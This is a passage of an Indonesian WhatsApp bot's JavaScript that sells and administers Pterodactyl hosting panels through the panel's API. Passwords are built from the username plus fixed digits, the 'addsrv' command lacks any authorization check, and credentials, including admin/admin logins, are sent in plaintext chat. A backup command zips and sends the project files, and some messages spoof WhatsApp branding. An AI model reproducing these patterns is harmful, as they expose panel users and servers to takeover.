⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "8gb": {
if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "200"
let disk = "8000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" 
if (!u) return
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kalz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kalz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "ramlist":

lrm = `RAM YANG TERSEDIA :
1GB ✅
2GB ✅
3GB ✅
4GB ✅
5GB ✅
6GB ✅️
7GB ✅️
8GB ✅️
UNLI (KHUSUS ADMIN SERVER)`
kalz.sendMessage(from, {text : lrm}, {quoted : fcall})
break 
case 'panel': {
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: 'Menu KalzxBot',
highlight_label: 'Recomended 🔥',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.5gb ${username2},${u2}`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.6gb ${username2},${u2}`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.7gb ${username2},${u2}`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.8gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By @WhatsApp', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Please choose the size you want to buy`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/ced387c5e323410ecea9f.jpg" } }, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'reinstall': {
if (!isCreator) return reply(mess.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "detusr": {
if (!isCreator) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
let u = res.attributes
reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan: 
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${tanggal2}
UPDATED AT: ${server.updated_at}`)
}
break
case "listsrv": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await kalz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "listusr": {
  if (!isCreator) return reply(mess.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await kalz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "delsrv": {
      if (!isCreator) return reply(`KHUSUS OWN`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {
  if (!isCreator) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "addusr": {
if (!isCreator) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal2}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended 🔥',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By KalzxFluit', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`Please choose the size you want to buy`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2396b22796cc175c80f28.jpg" } }, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
kalz.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
case "admin": {
if (!isCreator) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *KalzxBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Silakan Login Dengan Info Akun Di Bawah 😁`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})

} 
break
case "listadmin": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await kalz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
		 if (!isCreator) return reply(`NGAPAIN ANJG`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
kalz.sendMessage(mq1, {text:`*───❖》KalzxFluitl《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`}, m) 
                 }
            break             
case "webpanel":
if (!isCreator) return reply(mess.OnlyOwner)
ewe = `nih kak ${domain}`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return reply(`Owner Only Feature`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isCreator) return reply('kusus Owner')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
case 'tutorial': {
await loading()
tut = `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: tut,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
//=================================================//
case 'backup':
        {
          if (!isCreator) return reply(mess.owner)
     await reply("Sabar Mas Lagi Backup!!!");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "haikal" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r Kayy.zip ${ls.join(" ")}`);
          await kalz.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./Kayy.zip"),
              mimetype: "application/zip",
              fileName: "cpanelKayy.zip",
            },
            { quoted: fcall }
          );
          await execSync("rm -rf Kayy.zip");
        }
        break
// ======================
//=================================================//
case 'hdr': {
await loading() 
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			kalz.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: fcall})
			}
			break
case 'getcase': {

const getCase = (cases) => {

            return "case "+`'${cases}'`+fs.readFileSync("./kalz.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isCreator) return reply('ngapain')

                if (!q) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${q} tidak di temukan`)

        }
}
        break 
case 'biochange':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'enable') {
                    autobio = true
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                } else if (q == 'disable') {
                    autobio = false
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                }
                break   
case 'autobio': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *KalzxBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`click button *enable* to enable autobio\nclick button *disable* to disable autobio`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".biochange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".biochange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'readchange':
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Contoh ${prefix + command} enable/disable`)
if (q === 'enable') {
autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'disable') {
autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
break
case 'autoread': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
